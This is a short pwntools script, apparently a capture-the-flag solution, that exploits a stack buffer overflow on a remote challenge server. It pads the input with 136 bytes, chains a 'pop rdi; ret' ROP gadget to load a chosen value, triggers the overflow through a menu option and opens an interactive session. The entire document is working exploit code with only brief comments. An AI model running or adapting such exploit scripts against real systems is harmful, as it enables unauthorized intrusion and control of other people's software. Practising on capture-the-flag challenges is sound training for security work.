from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1340)

# Receive all the output text from the program
io.recvuntil(b"[Quit]")

# Address of "pop_rdi; ret;" gadget
pop_rdi = 0x4038db

# Choose "Fill buffer" option,
# and send payload which puts 0x1337 into rdi
io.sendlineafter(b"> ", b"1")
io.sendline(b"A"*136 + p64(pop_rdi) + p64(0x1337))

# Trigger exploit
io.sendlineafter(b"> ", b"3")

io.interactive()
